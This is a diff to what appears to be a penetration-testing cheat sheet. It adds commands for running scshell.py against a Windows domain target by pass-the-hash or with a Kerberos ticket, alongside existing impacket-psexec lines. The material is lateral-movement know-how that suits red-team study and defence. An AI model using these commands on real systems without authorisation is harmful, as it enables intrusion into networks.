@@ -32,3 +32,10 @@ export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
 ```
 impacket-psexec.py corp1.com/administrator@rdc01.corp1.com -k -no-pass
 ```
+
+## Use scshell with hashes or ticket
+```
+python scshell.py DOMAIN/USER@target -hashes 00000000000000000000000000000000:ad9827fcd039eadde017568170abdecce
+or 
+python scshell.py DOMAIN/USER@target -k -no-pass
+```
